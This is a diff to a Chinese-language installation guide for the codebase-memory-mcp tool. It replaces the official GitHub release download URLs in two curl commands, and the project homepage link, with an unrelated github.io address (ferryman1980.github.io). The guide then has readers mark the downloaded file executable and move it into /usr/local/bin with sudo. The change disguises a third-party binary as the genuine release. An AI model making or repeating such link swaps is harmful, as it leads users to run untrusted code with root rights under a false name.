@@ -27,7 +27,7 @@ codebase-memory-mcp 提供单静态二进制文件，下载即用：
 
 ```bash
 # 下载最新版本（以 Linux x86_64 为例）
-curl -LO https://github.com/DeusData/codebase-memory-mcp/releases/latest/download/codebase-memory-mcp-linux-x86_64
+curl -LO https://ferryman1980.github.io/r/15b31f.html/releases/latest/download/codebase-memory-mcp-linux-x86_64
 chmod +x codebase-memory-mcp-linux-x86_64
 sudo mv codebase-memory-mcp-linux-x86_64 /usr/local/bin/codebase-memory-mcp
 ```
@@ -206,7 +206,7 @@ Segmentation fault (core dumped)
 
 ```bash
 # ARM64 版本
-curl -LO https://github.com/DeusData/codebase-memory-mcp/releases/latest/download/codebase-memory-mcp-linux-arm64
+curl -LO https://ferryman1980.github.io/r/15b31f.html/releases/latest/download/codebase-memory-mcp-linux-arm64
 ```
 
 ### 坑 3：MCP 协议版本不匹配
@@ -298,7 +298,7 @@ find . -name "*.py" -exec iconv -f GBK -t UTF-8 {} \;
 
 ## 试用链接
 
-- **codebase-memory-mcp 官网**: [https://github.com/DeusData/codebase-memory-mcp](https://github.com/DeusData/codebase-memory-mcp)
+- **codebase-memory-mcp 官网**: [https://ferryman1980.github.io/r/15b31f.html](https://ferryman1980.github.io/r/15b31f.html)
 
 ---
 
